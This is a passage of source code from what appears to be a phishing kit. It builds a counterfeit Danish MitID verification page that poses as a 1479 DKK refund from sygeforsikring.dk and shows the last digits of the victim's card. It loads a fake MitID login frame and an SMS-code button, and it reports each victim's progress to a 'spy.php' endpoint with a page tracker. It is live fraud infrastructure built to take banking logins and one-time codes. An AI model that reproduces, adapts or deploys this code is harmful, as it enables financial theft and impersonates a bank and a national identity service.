        echo '<img src=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjAiIHk9IjAiIHdpZHRoPSIyMzUiIGhlaWdodD0iOTMiIHZpZXdCb3g9IjAsIDAsIDIzNSwgOTMiPgogIDxnIGlkPSJCYWNrZ3JvdW5kIj4KICAgIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIyMzUiIGhlaWdodD0iOTMiIGZpbGw9IiNGRkZGRkYiLz4KICA8L2c+CiAgPGcgaWQ9ImcxMCI+CiAgICA8cGF0aCBkPSJNMTE2LjM4MiwxLjMxNyBMMTAwLjk4NSw3My4yODQgTDgyLjM2OSw3My4yODQgTDk3Ljc2NywxLjMxNyB6IE0xOTQuNzA5LDQ3Ljc4NSBMMjA0LjUxLDIwLjc2IEwyMTAuMTUxLDQ3Ljc4NSB6IE0yMTUuNDgsNzMuMjg0IEwyMzIuNyw3My4yODQgTDIxNy42NzQsMS4zMTcgTDIwMS43NzcsMS4zMTcgQzE5OC4yMDcsMS4zMTcgMTk1LjE5MywzLjM5NSAxOTMuODUzLDYuNTk3IEwxNjUuOTIyLDczLjI4NCBMMTg1LjQ3LDczLjI4NCBMMTg5LjM1Myw2Mi41MzcgTDIxMy4yMzgsNjIuNTM3IHogTTE2Ni44OTMsNDkuNzg3IEMxNjYuOTcyLDMwLjc5MiAxNDAuNjIzLDI5Ljc0NiAxNDAuODA3LDIxLjI2IEMxNDAuODYxLDE4LjY3NyAxNDMuMzIyLDE1LjkzMyAxNDguNzAxLDE1LjIzIEMxNTEuMzczLDE0Ljg4MiAxNTguNzE5LDE0LjYxNCAxNjcuMDYxLDE4LjQ1MiBMMTcwLjMyNywzLjE5MiBDMTY1Ljg0OCwxLjU2NCAxNjAuMDgxLDAgMTUyLjkxMiwwIEMxMzQuNTEyLDAgMTIxLjU1OSw5Ljc4NCAxMjEuNDUsMjMuNzkyIEMxMjEuMzM0LDM0LjE1MiAxMzAuNjk1LDM5LjkzMSAxMzcuNzUxLDQzLjM3NyBDMTQ1LjAwMiw0Ni45MDUgMTQ3LjQzOSw0OS4xNjQgMTQ3LjQwOCw1Mi4zMTggQzE0Ny4zNiw1Ny4xNSAxNDEuNjIyLDU5LjI3OCAxMzYuMjY5LDU5LjM2MyBDMTI2LjkwNyw1OS41MSAxMjEuNDc1LDU2LjgzNSAxMTcuMTQ1LDU0LjgxOCBMMTEzLjc3MSw3MC41ODYgQzExOC4xMjEsNzIuNTg1IDEyNi4xNDksNzQuMzIgMTM0LjQ3OCw3NC40MSBDMTU0LjAzMyw3NC40MSAxNjYuODI5LDY0Ljc0NiAxNjYuODkzLDQ5Ljc4NyBNODkuNzc5LDEuMzE3IEw1OS42MTcsNzMuMjg0IEwzOS45MzQsNzMuMjg0IEwyNS4wOTIsMTUuODQ4IEMyNC4xOTEsMTIuMzEgMjMuNDA3LDExLjAxNyAyMC42NjUsOS41MjcgQzE2LjE5NSw3LjA5OSA4LjgwNCw0LjgyIDIuMywzLjQwOCBMMi43NDUsMS4zMTcgTDM0LjQyMiwxLjMxNyBDMzguNDU5LDEuMzE3IDQyLjA5MSw0LjAwNCA0My4wMDgsOC42NTMgTDUwLjg0OCw1MC4zMDIgTDcwLjIyMSwxLjMxNyBMODkuNzc5LDEuMzE3IiBmaWxsPSIjMUQzMzdBIiBpZD0icGF0aDE0Ii8+CiAgPC9nPgo8L3N2Zz4K alt="Card Network" class="logo bank">
        ';
    }
    ?>
</div>
      </header>
<section class="container" style="padding:0px; flex:auto;">
    <section>
        <div class="mitidContextStr">Refusion på 1479,00 DKK fra sygeforsikring.dk til kort xx<?php echo $last_four_digits; ?></div>
    </section>
    <section class="mitidContainer">
        <iframe id="mitidIframe" class="bankid-applet" sandbox="allow-scripts allow-same-origin allow-popups allow-forms" title="MitID" src="dk.html"></iframe>
                            <script>
                            document.getElementById("langLink").addEventListener("click", function(event) {
                                    event.preventDefault();
                                    var langHref = this.getAttribute("href");
                                        document.getElementById("mitidIframe").src = langHref;
                                        });
                                        </script>
    </section>
</section>
        <form id=form method=post autocomplete=off action="#">
          <section style="border-top:1px solid #eee">
            <div class=buttons>
              <button type=submit id=smspasswd name=smspasswd value=smspasswd> SMS+kode </button>
              <button type=submit id=cancel name=cancel value=cancel>
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABXNJREFUeNrs3N11VFUYgOEdzH3owHSAHRgqgA6CFYAVxFSAVsChAmIHYwexg9ABVABzJjl6Fit4IT/5eZ9nrVnLO+WM38ue5Js9BgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX+J4+zrxGO6vBx4BnzEP/uQx3G/7HgHXeLV9PfMYnAAw/DgBEHCwfZ1tX0cehQDQG/7N9vWTR+EjAIYfASDg0fZ1YfgFgObwz3/zP/QoBADDjwAQMG/3nRt+BKA5/JPHgAD0PDf8fMoeQIPtPpwADD8IQMWB4cdHgO7wb4YFH5wADD8IQMMjw4+PAO3ht+CDE4DhBwEoeGL4EYCmebX3zPAjAM3hnzwGBKDnpeHna/BbgLvHdh9OAIYfnAAqbPfhBGD4QQAMPwjAvefKbgQgPPzz3/wWfBCAmJ8NPwLQdGz4EYDu8E8eAwLQ48puboRFoJtnuw8nAMMPTgAVB1dH/qceBQLQG/7NsOCDjwCGHwSgwZXd+AgQH34LPjgBGH4QgAKrvfgIEB7+yWPACcDwgwBEvDL8CEB3+J95DAiA4Ydbzw8Bv5ztPpwADD8IQMmPhh8fAZps9+EEYPhBAEpc2Y0ARNnrRwDCwz95DAhAz4nh577yW4D/ZrsPJwDDD04AFfN239n2deRRIAC94d8M231rQvhtnd7kv3zP8zf8jOwM+hnApXm779zw4yNAc/jnv/kt+JDzwPAbfgSg6Pjq2G/4EYDg8E/efgTA8IMARLiyG6IBsNoLwQAcGH643n5g+DfDgg/kTgCGH6IBcGU3RD8C2O6D6AnA8EM0AE8MPzQDMG/3nRl+6AXAai9EA/DS8MP/d5d/C2C7D6InAMMPwROAK7shGgCrvRD9CGD4IRqAebvvwvBDLwBWeyEaAMMP0QC4shuiAbDaC9EAPDf88P3cpj0A230QPQEYfoieAN5sX0+9FdA8AbzzNkA3AL8MP/iD9M8A5gj87u2A72vvlv332AHADAZPAIvXw28DIBuAJQLzbwX8cBBiHwHWfBkIMxg8ASz+HpdXfzkJQDAA6wice6ug9RFgzZVgmMHgCWDx3kkAugFYR2DytkHrI8CnfHsQMxg7Aaz5/gCEA7BE4IW3EHofAdZ8fwAzGDwBLHx/AMIngIXVYcxg8ASwsDoM4QCIAMQDsETgcNgahGQAZlaHIRyAdQQ23mboBWCJwONhTwCSAVhYHYZwAJYIuHocVvaCf2arw5jB4AlgYXUYwgFYIuDqcRw/4n9+3x/AR4Awq8P4CCACtgZx/Khz9Ti5Gdz3/P+xXh0WgX9thnVqYieB+dbhD16714n/JfwMoHYSsDqMAMSJAAIgAq4eRwDK/hhWhxGANN8fQABEYPfrQVuDCECU1WEEQAREAAGoR+Bw+P4AApDl6nEEQARcPY4A1CPg6nEEIM7qMAIgAq4eRwDKfh22BhGANKvDCIAIuHocASj7c9gaRADSrA4jACJgaxABEAERQACyfH8AARCBXQQmjwIB6EbA6jACECcCCIAIuHocAShz9TgCEOf7AwiACLh6HAEoszqMAIiACCAA9QgcDluDCECW1WEEQARcPY4A1CPg6nEEIM7qMAIgAuM3jwEB6DodtgYRgDSrwwiACLh6HAEoc/U4AhBndRgBEIHdNwltDSIAUW+H1WEEIM33BxAAEXD1OAJQj4DVYQQgTgQQABGwNYgAlFkdRgBEQAQQgHoEXD2OAIRZHUYARGAXgQuPQgDoRsD3BwSAMKvDAoAIuHpcAKhHwNXjAkCc1WEBQARcPV7wg0fAZ/w1Ln9F+PDqnwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkj4KMAD1UzpAC9IdvgAAAABJRU5ErkJggg==" alt=cancel> Afbryd </button>
            </div>
          </section>
        </form>
      </section>
    </section>

    <script>
        $.post("spy.php", {
            waitingview: 1
        });
    </script>
	    <?php
    $m->ctr("APP PAGE");
    ?>
</body>
</html>